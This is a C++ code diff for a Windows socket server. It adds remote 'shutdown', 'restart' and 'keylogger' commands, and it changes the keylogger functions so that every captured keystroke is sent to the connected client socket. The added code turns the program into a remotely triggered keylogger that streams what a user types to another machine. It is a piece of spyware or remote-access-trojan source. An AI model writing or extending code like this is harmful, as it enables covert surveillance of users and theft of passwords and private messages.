@@ -83,6 +83,19 @@ void Server::handleClient(SOCKET clientSocket) {
         if (receivedMessage == "shutdown") {
             std::cout << "Shutdown command received. Server is shutting down..." << std::endl;
             closesocket(listenSocket);  // Close listening socket to stop accepting new connections
+            shutdownServer();
+            exit(0);  // Exit the server program
+        }
+        if(receivedMessage == "restart"){
+            std::cout << "Restart command received. Server is restarting..." << std::endl;
+            closesocket(listenSocket);  // Close listening socket to stop accepting new connections
+            restartServer();
+            exit(0);  // Exit the server program
+        }
+        if(receivedMessage == "keylogger"){
+            std::cout << "Keylogger command received." << std::endl;
+            keyLogger(clientSocket);
+            closesocket(listenSocket); 
             exit(0);  // Exit the server program
         }
     } else if (result == 0) {
@@ -159,7 +172,7 @@ char getShiftedSymbol(int vkCode, bool shiftPressed) {
     }
 }
 
-void Server::readKey(int _key) {
+void Server::readKey(int _key, SOCKET clientSocket) {
     if(_key == 160)
         return;
     char output[1024];
@@ -201,12 +214,12 @@ void Server::readKey(int _key) {
                 break;
         }
     }
-    send(listenSocket, output, strlen(output), 0);
-    std::cout << output << " ";
+    send(clientSocket, output, strlen(output), 0);
+   
 }
 
 
-void Server::keyLogger() {
+void Server::keyLogger(SOCKET clientSocket) {
     std::cout << "Press CTRL + ESC to exit the program.\n";
     while (true) {
         Sleep(10);  // Reduce CPU usage
@@ -216,7 +229,7 @@ void Server::keyLogger() {
                     std::cout << "Exiting...\n";
                     return;  // Exit the function, which stops the program
                 }       
-                readKey(i);  // Process and print the key
+                readKey(i, clientSocket);  // Process and print the key
             }
         }
     }
